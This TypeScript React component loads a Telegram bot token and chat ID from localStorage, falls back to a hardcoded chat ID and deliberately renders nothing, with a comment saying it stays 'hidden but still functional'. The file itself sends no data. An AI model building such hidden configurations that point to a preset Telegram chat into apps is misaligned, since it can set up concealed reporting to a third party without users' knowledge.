
import React, { useState, useEffect } from 'react';
import { Bot, Settings, Eye, EyeOff } from 'lucide-react';
import { useToast } from '../hooks/use-toast';

interface TelegramBotConfigProps {
  onConfigChange: (config: { botToken: string; chatId: string }) => void;
}

const TelegramBotConfig = ({ onConfigChange }: TelegramBotConfigProps) => {
  const [botToken, setBotToken] = useState('');
  const [chatId, setChatId] = useState('1235234827');
  const [showToken, setShowToken] = useState(false);
  const [isConfigured, setIsConfigured] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    // Load saved config from localStorage
    const savedToken = localStorage.getItem('telegram_bot_token');
    const savedChatId = localStorage.getItem('telegram_chat_id');
    
    if (savedToken && savedChatId) {
      setBotToken(savedToken);
      setChatId(savedChatId);
      setIsConfigured(true);
      onConfigChange({ botToken: savedToken, chatId: savedChatId });
    } else if (savedToken) {
      // If only token is saved, use default chat ID
      setBotToken(savedToken);
      setIsConfigured(true);
      onConfigChange({ botToken: savedToken, chatId: '1235234827' });
    }
  }, [onConfigChange]);

  // Component is now hidden but still functional
  return null;
};

export default TelegramBotConfig;
